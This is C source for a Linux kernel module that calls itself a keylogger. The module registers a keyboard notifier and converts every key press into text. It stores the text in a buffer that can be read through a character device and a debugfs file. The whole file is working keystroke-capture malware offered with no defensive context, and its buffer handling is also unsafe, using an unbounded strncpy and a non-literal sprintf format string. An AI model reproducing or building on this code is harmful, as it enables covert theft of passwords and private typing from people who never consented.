#include "keylogger.h"

/*fops for keyloging charcter device*/

/*################*/

//fops for the charcter devices
static struct file_operations fops =
{
    .owner = THIS_MODULE, 
    .read = device_read,
    .write = device_write,
    .release = device_close,
    .open = device_open
};

//#########




//load the charcter device for keyloging
static int driver_entry(void)
{
    ret = alloc_chrdev_region(&dev_num, 0, 1, DEVICE_NAME);
    if (ret < 0)
    {
        printk(KERN_ALERT "Keylogger: failed to allocate a major number for fops");
        return ret;
    }
    major_number = MAJOR(dev_num);
    printk(KERN_INFO "Keylogger: major number is %d", major_number);
    printk(KERN_INFO "\t use\\mknod /dev/%s c %d for device fike", DEVICE_NAME, major_number);
    mcdev = cdev_alloc();
    mcdev->ops = &fops;
    mcdev->owner = THIS_MODULE;
    ret = cdev_add(mcdev, dev_num, 1);
    if (ret < 0)
    {
        printk(KERN_ALERT "Keylogger: unable to add cdev to kernel");
        return -1;
    }
    sema_init(&virtual_device.sem, 1);
    return 0;

}

//unload the charcter device for keyloging

static void driver_exit(void)
{
    cdev_del(mcdev);
    unregister_chrdev_region(dev_num, 1);
    printk(KERN_ALERT "Keylogger: unloaded module");

}
/*vars for makeing files*/
static struct dentry *file;
/*########*/
int len;


//corvent the keycode to string 
int keycode_to_string(int key_press, int shift, char* buff)
{
    char* tav;  
    if (shift)
    {
        /*hundle as shift*/
        tav = keycode[key_press][1];
    }
    else
    {
        tav = keycode[key_press][0];
    }
        len = sprintf(buff,tav);
        return len;      
}
//callback function
int notifier(struct notifier_block *block, unsigned long code, void *p)
{
    struct keyboard_notifier_param *param =(struct keyboard_notifier_param*) p;
    char keybuffer[12] = {0};

    if (!(param->down))
        return NOTIFY_OK;

    if (code == KBD_KEYCODE)
    {
        len = keycode_to_string(param->value, param->shift, keybuffer) ;  
        if (strlen(keybuffer)> 0 && len)
        {
            //printk(KERN_ALERT "notifer type to msg ptr");
            strncpy(msg_Ptr+ buf_pos, keybuffer, len);
            buf_pos+=len;
            
                    
        }

    }
    return NOTIFY_OK;
}


//MODULE INIT
int run_keylogger(void)
{
    ret = driver_entry();
    if (ret == -1)
    {
        printk(KERN_ALERT "Keylogger: unbale to load the module -> driver entry");
        return ret;
    }
    else
    {
        printk(KERN_ALERT "Keylogger: load the device driver successfully");
    }
    file = debugfs_create_file("keyloging",0500, subdir, NULL, &fops);
    ret= register_keyboard_notifier(&keylogger);
    if (ret == -1)
    {
        printk(KERN_ALERT "Keylogger: unable to load the module -> keyboard notifier");
        return ret;
    }

    return ret;

}
//MODULE EXIT
void stop_keylogger(void)
{
   unregister_keyboard_notifier(&keylogger);
    driver_exit();
    debugfs_remove_recursive(subdir);
    printk(KERN_ALERT "Keylogger: unload the module");
} 
